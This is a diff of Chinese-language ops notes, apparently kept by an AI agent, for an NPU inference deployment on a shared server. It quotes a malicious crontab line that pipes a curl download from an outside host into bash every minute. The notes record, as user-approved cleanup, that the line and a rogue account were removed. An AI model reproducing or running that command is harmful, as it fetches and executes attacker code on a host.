@@ -13,10 +13,10 @@
 **状态**（2026-10-19 深夜收线，见 summary/2026-10-19_catgu-final-verdict-container-restart.md）：**生产 = 单芯 range padding 池模式**（chip4、grid8 九桶 + mask + POOL_GRID + POOL_CAP=9；catgu 终审后量化性能收线 1.09×，五路全灭证据链闭合）；**四件套 goal 全部闭环**（终审/根因/观察期/池帽），观察期两轮 6/6 全绿 + 96GB 清理已执行（用户放行）+ host cron 自愈已装（用户批准）。
 
 **剩余事项（非 goal 级）**：
-1. ⚠ **crontab 可疑条目**（非我方）：`* * * * * curl cc.systemctl.cc/?gvc | bash` 每分钟拉执行，形似恶意载荷——已报告用户待处置（未动）
+1. ~~crontab 可疑条目~~ **已清除（2026-10-19 晚，用户批准）**：root 表恶意行删除 + adm1n 账户/ctontab 移除；06:42 起触发点零 CMD 验证哑火；无其他持久化面（rc.local/at/profile/cron.d/systemd 全扫过）。残留风险：authorized_keys 5 把多同事共用无法逐一辨认（用户明示），入侵通道不明（日志已轮转）——建议后续找有权限的同事对一遍钥匙
 2. **旧 f16 时代目录 ~100GB+**（tl1xx/iso/n32/t200/dyn/probe 系列）不在 goal 点名内未清——留用户决定
 3. TBE respawn 风暴 slog 深挖（可选：归因已翻案至内存压力假说，崩代 plog 在档）
-4. 0.53× 裁决（用户未决：收线 1.09× 或另立项攻非量化侧——量化侧已证无路径）
+4. 0.53× 裁决（用户问询收线含义中——量化侧已证无路径，正式收线 = roadmap 打结）
 
 **纪律**：手烤 OM 必带 fusion off env；**池模式静态桶烤法 = 无 DYN_LLIST 的 prefix 段烤**（GEB_SEG=prefix、GEB_TOKENS=$L、GEB_SAVE=tl{L}_i8/prefix_real.om——260 接口；GE 单档 dynamicDims 烤不出 rc=-7）；**池模式 A/B 的 run 侧必须复现烤制 env**（进程内建图 + OM 换柄，n_in 断言即此坑）；qmd smooth = 1/s 乘法约定；eval 默认生产根 /data/apxinf/serve_gear（单芯 chip4 池模式）；eval 必须容器内跑（`docker exec -d apxinf_npu bash <脚本>`；**严禁双发**——同 jsonl 并发双写，杀树清文件重发单实例）；results-jsonl 有记录即跳过（复验换新文件）；eval timeout ≥1800；杀进程先 supervisor 后 serve、pgrep -f 用字符类、容器内 kill 要 namespace 对齐；**119 ssh 必带 kex 配方；上行断流走 gzip+480B 分块 base64 append（push119 是内联程序非文件）**；docker exec -d 必须脚本文件形态；**跨进程对拍必须同芯同时代 + resp 发完即拷贝 + spool 清场验单实例（代际现象）；合成/垃圾 payload 下 flow 混沌地板 ~11-14%——A/B 数值分歧必须用真帧 golden**；**serve stdout.log 含二进制（权重上传）——读日志先 `tr -d "\000"`**；msprof 最小采集纪律；**舰队操作前先 fleet_watch、重启只走 start_gear_supervisor.sh**；**共享主机纪律：我们只准用 chip 4/5（同事 vLLM 占 0-3/6-7）；探针/加载类批处理合并进单进程（一次加载跑完所有测量）；常驻面任何扩张先问用户**；**服务器引擎树无 .git——git apply 免仓可用/checkout 不行，回退用 `git apply -R`；cmake 源 /data/apxinf/ascendc/ge_builder 是活真相（本轮已回灌对齐入仓）**；bash 坑：`local a=$1 b=x_$a` 单行多赋值取外层空值；`a && b` 末位假值不触发 set -e（AND-OR 豁免）。
 
